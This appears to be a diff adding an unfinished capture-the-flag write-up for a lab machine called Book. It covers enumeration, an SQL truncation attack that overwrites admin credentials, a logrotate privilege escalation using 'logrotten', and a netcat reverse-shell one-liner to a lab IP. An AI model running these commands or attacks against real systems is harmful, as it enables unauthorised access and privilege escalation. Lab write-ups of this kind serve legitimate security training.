@@ -1,0 +1,25 @@
+We start the box as always running nmap to see what ports are opened, we see SSH and HTTP port's opened.
+From the SSH version (OpenSSH 7.6p1) that nmap showed us we can say that the victim machine is running Ubuntu bionic (https://launchpad.net/ubuntu/+source/openssh/+changelog)
+Let's poke around the web server running on port 80 visiting the website and in the meanwhile running a ffuf to scan for hidden directories and files.
+We can see a login page, let's try to signup a new user.
+We quickly noticed that we can check existing users, due to the way the login is handled, after registering a new user we see some pages and we found interesting info, for example in the contact.php page we see the admin email admin@book.htb so maybe we can try to override or bruteforce admin credentials.
+One of the page available to the users is an upload page called collections.php where a user can submit a new book to the collections of book, this is definitely interesting as usually uploads can carry out vulnerabilities.
+During the enumeration ffuf discovered an hidden interesting directory called /admin, that probably is used to login as an admin, this page after a lot of tries doesn't seem vulnerable so let's come back to the original login page and see if that's vulnerable.
+Let's try to login with the admin email in some way, after a lots of tries we found that the registration process is vulnerable to sql truncation attack, with this attack we can overwrite admin credentials and then login as admin in the /admin login page.
+We successfully logged in as admin and now we have more pages to take a look.
+
+
+exploit.py
+
+id_rsa & chmod
+
+login with ssh
+
+copy logrotate and compile
+
+echo '' > backups/access.log && ./logrotten -p payloadfile /home/reader/backups/access.log
+echo 'test' > backups/access.log && ./logrotten -p payloadfile /home/reader/backups/access.log
+
+to write into payload file, we also need nc into tmp directory to make it to work
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/tmp/nc 10.10.14.97 9001 >/tmp/f 
+
